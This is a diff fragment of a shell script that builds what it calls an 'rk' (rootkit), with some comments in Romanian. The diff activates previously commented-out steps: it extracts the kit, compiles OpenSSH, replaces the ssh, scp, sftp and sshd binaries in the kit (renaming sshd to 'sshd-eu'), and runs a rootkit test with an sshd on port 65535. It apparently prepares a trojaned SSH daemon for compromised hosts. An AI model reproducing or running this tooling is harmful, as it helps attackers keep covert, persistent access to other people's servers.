@@ -179,27 +179,24 @@ else
         if [ ! -f $rk.tgz ] ; then echo -e "\033[0;31m [-] \033[0m\033[0m file missing - download failed. aborting" ; echo ; exit ; fi
         if [ ! -f p2 ] ; then echo -e "\033[0;31m [-] \033[0m\033[0m file missing - download failed. aborting" ; echo ; exit ; fi
         echo -e "\033[0;32m [+] \033[0m\033[0m trying to make new rk" # green
-        echo "$rk.tgz"
-        #tar mzxf $rk.tgz ; rm -rf $rk.tgz
+        tar mzxf $rk.tgz ; rm -rf $rk.tgz
         maindir=`pwd` ; rkdir="$maindir/$rk"
         cd $rkdir
-        echo "$maindir"
-        echo "$rkdir"
-        #rm -rf 1tempfiles/*
-        #tar zxf openssh-5.9p1-cu-patch-SSHD-eu.tgz -C 1tempfiles/
-        #cd 1tempfiles/openssh-5.9p1
-        #./configure --prefix=/usr --sysconfdir=/etc/ssh
-        #make
-        #if [ ! -f sshd ] ; then echo -e "\033[0;31m [-] \033[0m\033[0m failed to make new rk. aborting" ; echo ; exit ; fi
-        #rm -rf ../../default/ssh ; mv ssh ../../default/
-        #rm -rf ../../default/scp ; mv scp ../../default/
-        #rm -rf ../../default/sftp ; mv sftp ../../default/
-        #rm -rf ../../default/sshd-* ; mv sshd ../../default/sshd-eu
-        #cd ../.. ; rm -rf 1tempfiles/*  ### acum sunt in $rkdir
-        #cd $maindir
+        rm -rf 1tempfiles/*
+        tar zxf openssh-8.5p1.tar.gz -C 1tempfiles/
+        cd 1tempfiles/openssh-8.5p1
+        ./configure --prefix=/usr --sysconfdir=/etc/ssh
+        make
+        if [ ! -f sshd ] ; then echo -e "\033[0;31m [-] \033[0m\033[0m failed to make new rk. aborting" ; echo ; exit ; fi
+        rm -rf ../../default/ssh ; mv ssh ../../default/
+        rm -rf ../../default/scp ; mv scp ../../default/
+        rm -rf ../../default/sftp ; mv sftp ../../default/
+        rm -rf ../../default/sshd-* ; mv sshd ../../default/sshd-eu
+        cd ../.. ; rm -rf 1tempfiles/*  ### acum sunt in $rkdir
+        cd $maindir
         echo -e "\033[0;32m [+] \033[0m\033[0m starting rk test " # green
-        #chmod +x p2
-        #cd $rkdir ; ./run test $rk 1>>$maindir/1tempfiles/log.rktest 2>>$maindir/1tempfiles/log.rktest
+        chmod +x p2
+        cd $rkdir ; ./run test $rk 1>>$maindir/1tempfiles/log.rktest 2>>$maindir/1tempfiles/log.rktest
         echo -e "\033[0;32m [+] \033[0m\033[0m rk test done (logs in $maindir/1tempfiles/log.rktest). please manually check:"
         echo
         echo "          $rkdir/$rk/test-sshd -p 65535"
